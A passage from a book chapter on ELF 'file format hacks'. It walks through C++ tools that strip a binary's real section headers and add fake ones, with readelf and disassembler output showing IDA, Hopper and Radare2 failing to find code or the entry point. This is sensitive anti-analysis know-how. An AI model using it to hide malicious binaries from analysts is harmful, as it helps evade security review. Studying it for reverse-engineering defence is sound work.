(!add_text_section(p_data, strings))**\n\n\n-----\n\n###### Chapter 3: File Format Hacks 91\n\n{\nstd::cerr << \"Failed to find the writable LOAD segment\" << std::endl;\n**return false;**\n}\n\n// .shstrtab\nElf64_Shdr strtab = {};\nstrtab.sh_name = strings.size();\nstrtab.sh_type = SHT_STRTAB;\nstrtab.sh_flags = 0;\nstrtab.sh_addr = 0;\nstrtab.sh_offset = p_data.size() + sizeof(Elf64_Shdr);\nstrtab.sh_size = 0;\nstrtab.sh_link = 0;\nstrtab.sh_info = 0;\nstrtab.sh_addralign = 4;\nstrtab.sh_entsize = 0;\nstrings.append(\".shstrtab\");\nstrings.push_back('\\x00');\nstrtab.sh_size = strings.size();\np_data.append(reinterpret_cast<char*>(&strtab), sizeof(strtab));\np_data.append(strings);\n\n**return true;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./fakeHeadersXBit <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to ropen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\n\n\n-----\n\n###### Chapter 3: File Format Hacks 92\n\ninputFile.close();\n\n**if (!edit_elf_header(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\n**if (!append_sections(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cerr << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n**return EXIT_SUCCESS;**\n}\n\n##### As usual, compile fakeHeadersXBit with CMake.\n\n###### Compiling fakeHeadersXBit\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/fakeHeadersXbit/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit/build$ cmake \\\n..\n-- The CXX compiler identification is GNU 5.4.0\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n\n\n-----\n\n###### Chapter 3: File Format Hacks 93\n\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_h\\\nacks/fakeHeadersXbit/build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit/build$ make\nScanning dependencies of target fakeHeadersXBit\n\n[ 50%] Building CXX object CMakeFiles/fakeHeadersXBit.dir/src/fakeHeadersXBit.cpp.o\n\n[100%] Linking CXX executable fakeHeadersXBit\n\n[100%] Built target fakeHeadersXBit\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit/build$\n\n##### Previously you compiled Trouble and removed the section headers table using the stripBinary tool. Now you can add the fake section headers table using fakeHeader- sXBit,\n\n###### Adding a fake section table to Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit/build$ ./fake\\\nHeadersXBit ~/antire_book/chap_3_format_hacks/trouble/build/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersXbit/build$\n\n##### The output isn’t very exciting, but check out how Trouble has changed.\n\n###### Trouble with the fakeHeadersXBit section headers table\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 9560 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 94\n\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 4\nSection header string table index: 3\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .data PROGBITS 0000000000400000 00000000\n0000000000001c1c 0000000000000000 WA 0 0 4\n\n[ 2] .text PROGBITS 0000000000601fe8 00001fe8\n0000000000000178 0000000000000000 AX 0 0 4\n\n[ 3] .shstrtab STRTAB 0000000000000000 00002658\n0000000000000017 0000000000000000 0 0 4\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\nThere are no section groups in this file.\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x0000000000001c1c 0x0000000000001c1c R E 200000\nLOAD 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000178 0x00000000000004b8 RW 200000\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000018 0x0000000000000018 R 1\n\nSection to Segment mapping:\nSegment Sections...\n\n00 .data\n01 .text\n02\n03\n\n\n-----\n\n###### Chapter 3: File Format Hacks 95\n\nThere is no dynamic section in this file.\n\nThere are no relocations in this file.\n\nThe decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not\\\n\ncurrently supported.\n\nNo version information found in this file.\n\n##### readelf shows the four section headers that fakeHeadersXBit added. Also, you can see that the .data and .text sections overlap with the same address space covered by the LOAD segments in the program headers. However, notice that the read/write/execute bits don’t match between the program headers and section headers table.\n\n Now the question is, “How does this effect disassemblers?” Let’s start with IDA.\n\n Before applying the fake table section IDA found 54 functions in Trouble and the navigation bar appeared quite complete.\n\n###### “Navigation Bar on Trouble Without Sections Table”\n\n##### However, when IDA analyzes Trouble with the fakeHeadersXBit applied it only finds 22 functions and the navigation bar shows a lot of missing analysis.\n\n###### “Navigation Bar on Trouble With Fake Sections Table”\n\n##### Why did IDA fail? Consider the the entry point in disassembly.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 96\n\n Trouble’s entry point\n\nLOAD:00000000004002F2 **public start**\nLOAD:00000000004002F2 start proc near\nLOAD:00000000004002F2 xor rbp, rbp\nLOAD:00000000004002F5 mov r9, rdx\nLOAD:00000000004002F8 pop rsi\nLOAD:00000000004002F9 mov rdx, rsp\nLOAD:00000000004002FC and rsp, 0FFFFFFFFFFFFFFF0h\nLOAD:0000000000400300 mov r8, offset _term_proc\nLOAD:0000000000400307 mov rcx, offset _init_proc\nLOAD:000000000040030E mov rdi, offset sub_400130\nLOAD:0000000000400315 call sub_400566\n\n##### At 0x40030e you should notice that the address 0x400130 is moved into rdi. This address is the beginning of Trouble’s main() function. Normally, IDA would disas- semble that main() like this:\n\n###### The beginning of Trouble’s main() disassembled\n\nLOAD:0000000000400130 sub_400130 proc near ; DATA XREF: start+1C\nLOAD:0000000000400130\nLOAD:0000000000400130 var_68 = qword ptr -68h\nLOAD:0000000000400130 var_58 = qword ptr -58h\nLOAD:0000000000400130 var_50 = qword ptr -50h\nLOAD:0000000000400130 var_48 = byte ptr -48h\nLOAD:0000000000400130 var_20 = qword ptr -20h\nLOAD:0000000000400130\nLOAD:0000000000400130 push rbp\nLOAD:0000000000400131 push rbx\nLOAD:0000000000400132 mov edx, 6\nLOAD:0000000000400137 mov esi, 1\n\n##### But when the fakeHeadersXBit sections headers table is added to Trouble the disassembly of main() is never done:\n\n\n-----\n\n###### Chapter 3: File Format Hacks 97\n\n The beginning of Trouble’s main() not disassembled\n\n.data:0000000000400130 unk_400130 db 55h ; U ; DATA XREF: start+1C\n.data:0000000000400131 db 53h ; S\n.data:0000000000400132 db 0BAh ; ¦\n.data:0000000000400133 db 6\n.data:0000000000400134 db 0\n.data:0000000000400135 db 0\n.data:0000000000400136 db 0\n.data:0000000000400137 db 0BEh ; +\n\n##### Why does this happen? Remember that fakeHeadersXBit’s section headers table tells IDA that the area main() resides in is not executable. Therefore, IDA decides not to treat it as code. This forces the reverse engineer to manually disassemble these types of functions (or use a script to do so). Pretty neat!\n\n All disassemblers work differently and this section is a great example. For example, Hopper handles the fake section table even worse than IDA. Hopper is only able to mark four functions and only two of those are correctly disassembled. On the otherside of the coin, Radare2 doesn’t appear to be affected by the fake sections table. I believe Radare2 is not affected because it treats both the section entries and program segments as “sections” and the program segments take precedence. Although that is only a guess. The cool thing with Radare2 is you can look into a the code to find out. However, that is an excercise I’ll leave to the reader.\n\n#### Lying with .init\n\n##### As we saw in the previous section, a fake sections header table can cause a disassembler to not work properly. Are there more lies we can tell? I think there is. There are two special sections that you’ll often come across in ELF binaries: the .init and .fini sections. These sections contain code that execute before and after the main() function. If you include .init and .fini sections in the fake section headers table can you force the disassembler to disassemble at bad locations? Let’s update fakeHeadersXBit.cpp to include .init and .fini sections. We’ll need to update two functions: edit_elf_header() and add_data_section().\n\n\n-----\n\n###### Chapter 3: File Format Hacks 98\n\n Updated edit_elf_header()\n\n**bool edit_elf_header(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\n\n**if (ehdr->e_shoff != 0)**\n{\nstd::cerr << \"The binary already has a section table.\" << std::endl;\n**return false;**\n}\n\n**if (ehdr->e_shentsize != sizeof(Elf64_Shdr))**\n{\nstd::cerr << \"Unexpected section header size\" << std::endl;\n**return false;**\n}\n\nehdr->e_shoff = p_data.size();\nehdr->e_shnum = 6;\nehdr->e_shstrndx = 5;\n**return true;**\n}\n\n###### Updated add_data_section()\n\n**bool add_data_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; i++, phdr++)**\n{\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 99\n\n**if ((phdr->p_flags & PF_X) == PF_X)**\n{\nstd::size_t entry_physical = 8;\n\nElf64_Shdr init_header = {};\ninit_header.sh_name = p_strings.size();\ninit_header.sh_type = SHT_PROGBITS;\ninit_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;\ninit_header.sh_addr = phdr->p_vaddr;\ninit_header.sh_offset = phdr->p_offset;\ninit_header.sh_size = entry_physical;\ninit_header.sh_link = 0;\ninit_header.sh_info = 0;\ninit_header.sh_addralign = 4;\ninit_header.sh_entsize = 0;\np_strings.append(\".init\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&init_header),\n\n**sizeof(init_header));**\n\nElf64_Shdr data_header = {};\ndata_header.sh_name = p_strings.size();\ndata_header.sh_type = SHT_PROGBITS;\ndata_header.sh_flags = SHF_ALLOC | SHF_WRITE;\ndata_header.sh_addr = phdr->p_vaddr + entry_physical + 1;\ndata_header.sh_offset = phdr->p_offset + entry_physical + 1;\ndata_header.sh_size = phdr->p_filesz - (entry_physical + 1) - 8;\ndata_header.sh_link = 0;\ndata_header.sh_info = 0;\ndata_header.sh_addralign = 4;\ndata_header.sh_entsize = 0;\np_strings.append(\".data\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&data_header),\n\n**sizeof(data_header));**\n\nElf64_Shdr fini_header = {};\nfini_header.sh_name = p_strings.size();\nfini_header.sh_type = SHT_PROGBITS;\nfini_header.sh_flags = SHF_ALLOC | SHF_WRITE;\nfini_header.sh_addr = phdr->p_vaddr + phdr->p_filesz - 8;\nfini_header.sh_offset = phdr->p_offset + phdr->p_filesz - 8;\nfini_header.sh_size = 8;\n\n\n-----\n\n###### Chapter 3: File Format Hacks 100\n\nfini_header.sh_link = 0;\nfini_header.sh_info = 0;\nfini_header.sh_addralign = 4;\nfini_header.sh_entsize = 0;\np_strings.append(\".fini\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&fini_header),\n\n**sizeof(fini_header));**\n**return true;**\n}\n}\n}\n**return false;**\n}\n\n##### Recompile fakeHeadersXBit and Trouble. Use stripBinary to remove the real section headers table from Trouble and then use fakeHeadersXBit to attach the fake section headers table. If you’ve done this successfully then readelf should look like this:\n\n###### Trouble with the updated version of fakeHeadersXBit\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -a ./t\\\nrouble\nELF Header:\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\nClass: ELF64\nData: 2's complement, little endian\nVersion: 1 (current)\nOS/ABI: UNIX - System V\nABI Version: 0\nType: EXEC (Executable file)\nMachine: Advanced Micro Devices X86-64\nVersion: 0x1\nEntry point address: 0x4002f2\nStart of program headers: 64 (bytes into file)\nStart of section headers: 9560 (bytes into file)\nFlags: 0x0\nSize of this header: 64 (bytes)\nSize of program headers: 56 (bytes)\nNumber of program headers: 4\nSize of section headers: 64 (bytes)\nNumber of section headers: 6\n\n\n-----\n\n###### Chapter 3: File Format Hacks 101\n\nSection header string table index: 5\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .init PROGBITS 0000000000400000 00000000\n0000000000000008 0000000000000000 AX 0 0 4\n\n[ 2] .data PROGBITS 0000000000400009 00000009\n0000000000001c0b 0000000000000000 WA 0 0 4\n\n[ 3] .fini PROGBITS 0000000000401c14 00001c14\n0000000000000008 0000000000000000 WA 0 0 4\n\n[ 4] .text PROGBITS 0000000000601fe8 00001fe8\n0000000000000178 0000000000000000 AX 0 0 4\n\n[ 5] .shstrtab STRTAB 0000000000000000 000026d8\n0000000000000023 0000000000000000 0 0 4\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\nThere are no section groups in this file.\n\nProgram Headers:\nType Offset VirtAddr PhysAddr\nFileSiz MemSiz Flags Align\nLOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000\n0x0000000000001c1c 0x0000000000001c1c R E 200000\nLOAD 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000178 0x00000000000004b8 RW 200000\nGNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000\n0x0000000000000000 0x0000000000000000 RW 10\nGNU_RELRO 0x0000000000001fe8 0x0000000000601fe8 0x0000000000601fe8\n0x0000000000000018 0x0000000000000018 R 1\n\nSection to Segment mapping:\nSegment Sections...\n\n00 .init .data .fini\n01 .text\n02\n03\n\n\n-----\n\n###### Chapter 3: File Format Hacks 102\n\nThere is no dynamic section in this file.\n\nThere are no relocations in this file.\n\nThe decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not\\\n\ncurrently supported.\n\nNo version information found in this file.\n\n##### Now if you try to load Trouble in Radare2 you’ll encounter an interesting problem.\n\n###### Trouble with updated fakeHeadersXBit in Radare2\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trou\\\nble\nWarning: Cannot initialize dynamic strings\n-- To remove this message, put `dbxenv suppress_startup_message 7.5' in your .dbxrc\n\n[0x004002f2]> aaa\n\n[Cannot find function 'entry0' at 0x004002f2 entry0 (aa)\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[Warning: Searching xrefs in non-executable regiones (aar)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x004002f2]> pdf\np: Cannot find function at 0x004002f2\n\n[0x004002f2]>\n\n##### Radare2 can’t find the entry point! In fact, Radare2 doesn’t find any functions! What happened? To get a clearer view I started the Radare2 web GUI.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 103\n\n Starting the Radare2 Web GUI\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 -c=H .\\\n/trouble\nWarning: Cannot initialize dynamic strings\nStarting http server...\nopen http://localhost:9090/\nr2 -C http://localhost:9090/cmd/\n\n##### The problem becomes obvious when looking at 0x400000. Remember that 0x400000 is where the ELF header starts, but our section headers table also says .init starts there. It appears that Radare2 starts disassembling the fake .init section and never stops!\n\n###### Radare2 disassembling the fake .init section\n\n; [10] va=0x00400000 pa=0x00000000 sz=64 vsz=64 rwx=m-rw- ehdr\n,=< ;-- section..init:\n,=< ;-- section.LOAD0:\n,=< ;-- section.ehdr:\n,=< 0x00400000 jg 0x400047\n| 0x00400002 add r8b, byte [rcx]\n| 0x00400006 add dword [rax], eax\n| ;-- section..data:\n| 0x00400008 ~ add byte [rax], al\n| 0x0040000a add byte [rax], al\n\n##### When Radare2 tries to disassemble the entry point it finds that it has already been marked as code which stops any further analysis.\n\n Unfortunately, this trick doesn’t work on IDA. While IDA also disassembles the fake .init section it stops the disassembly where .init stops.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 104\n\n IDA disassembling the fake .init section\n\n.init:0000000000400000 public _init_proc\n.init:0000000000400000 _init_proc proc near\n.init:0000000000400000 jg short near ptr unk_400047\n.init:0000000000400002 db 4Ch\n.init:0000000000400002 add r8b, [rcx]\n.init:0000000000400006 add [rax], eax\n.init:0000000000400006 _init_proc endp\n.init:0000000000400006\n.init:0000000000400006 _init ends\n.init:0000000000400006\n\n##### However, its useful to know that IDA will diassemble the fake .init section. Maybe we can stop the disassembly of the entry point using .init. Let’s update the add_- data_section() function in fakeHeadersXBit.cpp so that the .init section contains the entry point address.\n\n###### Updated add_data_section()\n\n**bool add_data_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; i++, phdr++)**\n{\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n**if ((phdr->p_flags & PF_X) == PF_X)**\n{\nstd::size_t entry_physical = (ehdr->e_entry + 1) - phdr->p_vaddr;\n\nElf64_Shdr init_header = {};\ninit_header.sh_name = p_strings.size();\ninit_header.sh_type = SHT_PROGBITS;\ninit_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;\ninit_header.sh_addr = phdr->p_vaddr;\ninit_header.sh_offset = phdr->p_offset;\ninit_header.sh_size = entry_physical;\ninit_header.sh_link = 0;\n\n\n-----\n\n###### Chapter 3: File Format Hacks 105\n\ninit_header.sh_info = 0;\ninit_header.sh_addralign = 4;\ninit_header.sh_entsize = 0;\np_strings.append(\".init\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&init_header),\n\n**sizeof(init_header));**\n\nElf64_Shdr data_header = {};\ndata_header.sh_name = p_strings.size();\ndata_header.sh_type = SHT_PROGBITS;\ndata_header.sh_flags = SHF_ALLOC | SHF_WRITE;\ndata_header.sh_addr = phdr->p_vaddr + entry_physical + 1;\ndata_header.sh_offset = phdr->p_offset + entry_physical + 1;\ndata_header.sh_size = phdr->p_filesz - (entry_physical + 1) - 8;\ndata_header.sh_link = 0;\ndata_header.sh_info = 0;\ndata_header.sh_addralign = 4;\ndata_header.sh_entsize = 0;\np_strings.append(\".data\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&data_header),\n\n**sizeof(data_header));**\n\nElf64_Shdr fini_header = {};\nfini_header.sh_name = p_strings.size();\nfini_header.sh_type = SHT_PROGBITS;\nfini_header.sh_flags = SHF_ALLOC | SHF_WRITE;\nfini_header.sh_addr = phdr->p_vaddr + phdr->p_filesz - 8;\nfini_header.sh_offset = phdr->p_offset + phdr->p_filesz - 8;\nfini_header.sh_size = 8;\nfini_header.sh_link = 0;\nfini_header.sh_info = 0;\nfini_header.sh_addralign = 4;\nfini_header.sh_entsize = 0;\np_strings.append(\".fini\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&fini_header),\n\n**sizeof(fini_header));**\n**return true;**\n}\n}\n}\n\n\n-----\n\n###### Chapter 3: File Format Hacks 106\n\n**return false;**\n}\n\n##### Recompile Trouble and fakeHeadersXBit again. Remove Trouble’s section headers ta- ble with stripBinary and apply the fake section headers table with fakeHeadersXBit. If you look at the section headers table in Trouble you’ll see that the .init section has become much larger.\n\n###### Trouble’s fake sections\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ readelf -S ./t\\\nrouble\nThere are 6 section headers, starting at offset 0x2558:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .init PROGBITS 0000000000400000 00000000\n00000000000002f3 0000000000000000 AX 0 0 4\n\n[ 2] .data PROGBITS 00000000004002f4 000002f4\n0000000000001920 0000000000000000 WA 0 0 4\n\n[ 3] .fini PROGBITS 0000000000401c14 00001c14\n0000000000000008 0000000000000000 WA 0 0 4\n\n[ 4] .text PROGBITS 0000000000601fe8 00001fe8\n0000000000000178 0000000000000000 AX 0 0 4\n\n[ 5] .shstrtab STRTAB 0000000000000000 000026d8\n0000000000000023 0000000000000000 0 0 4\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n##### Load the new version of Trouble into IDA. The first sign of failure is the navigation bar. It looks like nothing gets disassembled!\n\n###### “IDA navigation bar for Trouble with fake sections headers table and an obfuscated entry”\n\n##### Now check out where you used overlapped the entry point and .init.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 107\n\n Hiding the entry point from IDA by overlapping the entry and .init\n\n.init:00000000004002F0 db 2 dup(0)\n.init:00000000004002F2 public start\n.init:00000000004002F2 start db 48h\n.init:00000000004002F2 _init ends\n.init:00000000004002F2\n.data:00000000004002F4 ; ==================================================\n.data:00000000004002F4\n.data:00000000004002F4 ; Segment type: Pure data\n.data:00000000004002F4 ; Segment permissions: Read/Write\n.data:00000000004002F4 _data segment dword public 'DATA' use64\n.data:00000000004002F4 assume cs:_data\n.data:00000000004002F4 ;org 4002F4h\n.data:00000000004002F4 db 0EDh ; f\n.data:00000000004002F5 db 49h ; I\n\n##### Because IDA stops the disassembly at the boundary of .init, it is unable to disassemble any of the entry point. Without the entry point getting diassembled, IDA fails to diassemble anything else due to the fact that you also messed with the executable flag.\n\n#### Hiding the Entry Point\n\n##### In the previous section, you stopped IDA from disassembing the entry point by messing with the size attribute in the section header. In this section, you’ll learn another a little lie that will hide the entry point entirely.\n\n Consider the fields of the section header struct in C.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 108\n\n 64-bit ELF section header struct\n\n**struct Elf64_Shdr**\n{\n\n**uint32_t sh_name;**\n**uint32_t sh_type;**\n**uint64_t sh_flags;**\nElf64_Addr sh_addr;\nElf64_Off sh_offset;\n**uint64_t sh_size;**\n**uint32_t sh_link;**\n**uint32_t sh_info;**\n**uint64_t sh_addralign;**\n**uint64_t sh_entsize;**\n};\n\n##### The three fields this technique is concerned with are sh_addr (the virtual address), sh_offset (the physical offset), and sh_size. It’s also important to note that the entry point address in the ELF header is the virtual address.\n\n Now, let’s say you have a virtual address and you want to look up the actual location in the binary. You look at the section headers table and find which section the virtual address would fall within by calculating the range of sh_addr and sh_addr + sh_size. Once you’ve found the section, you’ll want to calculate the physical offset of your virtual address by subtracting the sh_addr and then adding the sh_offset. You should now know the exact offset into the binary where you can find your virtual address.\n\n However, what if we put in a bogus value for sh_addr? How does that break the calculation? Let’s say we have the following values:\n\nvirtual_address = 0x4002f0\nsh_addr = 0x400000\nsh_size = 0x000800\nsh_offset = 0\n\n##### Normally, you’d be able to find 0x4002f0 at 0x2f0 bytes into the file ((0x4002f0 - 0x400000) + 0). However, if you introduce a little lie and say sh_addr = 0x400010 then the calculation changes. Now the math comes out that 0x4002f0 is 0x2e0 bytes into the file.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 109\n\n##### This is a technique you can use to hide the entry point. If you add a fake section headers table and alter the base address of the section that contains the entry point then any disassembler relying exclusively on the sections headers table won’t be able to properly find the entry point in the file.\n\n I wrote some code that will do this so you can examine it further. The project is called fakeHeadersHideEntry and can be found in the chapter three directory. There are two files: CMakeLists.txt and fakeHeadersHideEntry.cpp.\n\n###### chap_3_format_hacks/fakeHeadersHideEntry/CMakeLists.txt\n\nproject(fakeHeadersHideEntry CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow\")\nadd_executable(${PROJECT_NAME} src/fakeHeadersHideEntry.cpp)\n\n###### chap_3_format_hacks/fakeHeadersHideEntry/src/fakeHeadersHideEntry.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <ctime>\n#include <elf.h>\n\n/**\n\n - This tool will cause disassemblers that rely on the sections table for\n\n - virtual address mapping to fail to correctly find the entry point. This\n\n - tool expects the provided binary to have no sections table. It will add\n\n - its own fake table with four sections:\n \n - - null header\n\n - - .text: the section the code is in. This will have an altered sh_addr.\n\n - - .data: the r/w data section\n\n - - .shstrtab: the strings table.\n \n - This code makes the assumption that the binary has two PF_LOAD segments in\n\n - the program table. One segment with PF_X set and one with PF_W set.\n*/\n\n\n-----\n\n###### Chapter 3: File Format Hacks 110\n\n/*\n\n - Edits the ELF header to indicate that there are 4 section headers and that\n\n - the string table is the last one.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true if its possible to add a section table. false otherwise\n*/\n**bool edit_elf_header(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\n\n**if (ehdr->e_shoff != 0)**\n{\nstd::cerr << \"The binary already has a section table.\" << std::endl;\n**return false;**\n}\n\n**if (ehdr->e_shentsize != sizeof(Elf64_Shdr))**\n{\nstd::cerr << \"Unexpected section header size\" << std::endl;\n**return false;**\n}\n\nehdr->e_shoff = p_data.size();\nehdr->e_shnum = 4;\nehdr->e_shstrndx = 3;\n**return true;**\n}\n\n/*\n\n - Finds the PF_X LOAD segment and creates a corresponding section header. The\n\n - base address is modified to throw off any disassembler that relies on the\n\n - section header only.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\param[in,out] p_strings the section table string names\n\n\n-----\n\n###### Chapter 3: File Format Hacks 111\n\n - \\return true if no error was encountered\n*/\n**bool add_data_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; i++, phdr++)**\n{\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n**if ((phdr->p_flags & PF_X) == PF_X)**\n{\nElf64_Shdr data_header = {};\ndata_header.sh_name = p_strings.size();\ndata_header.sh_type = SHT_PROGBITS;\ndata_header.sh_flags = SHF_ALLOC | SHF_EXECINSTR;\n// \"randomly\" create a different offset each run\nsrand((unsigned)time(0));\n**int base = rand() % 250;**\ndata_header.sh_addr = phdr->p_vaddr + base;\ndata_header.sh_offset = phdr->p_offset;\ndata_header.sh_size = phdr->p_filesz - base;\ndata_header.sh_link = 0;\ndata_header.sh_info = 0;\ndata_header.sh_addralign = 4;\ndata_header.sh_entsize = 0;\np_strings.append(\".text\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&data_header),\n\n**sizeof(data_header));**\n**return true;**\n}\n}\n}\n**return false;**\n}\n\n/*\n\n - This finds the PF_W segment and creates a matching section header named .data\n \n - \\param[in,out] p_data the ELF binary\n\n - \\param[in,out] p_strings the section table string names\n\n\n-----\n\n###### Chapter 3: File Format Hacks 112\n\n - \\return true if no error was encountered\n*/\n**bool add_text_section(std::string& p_data, std::string& p_strings)**\n{\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[0] + ehdr->e_phoff);\n\n**for (int i = 0; i < ehdr->e_phnum; 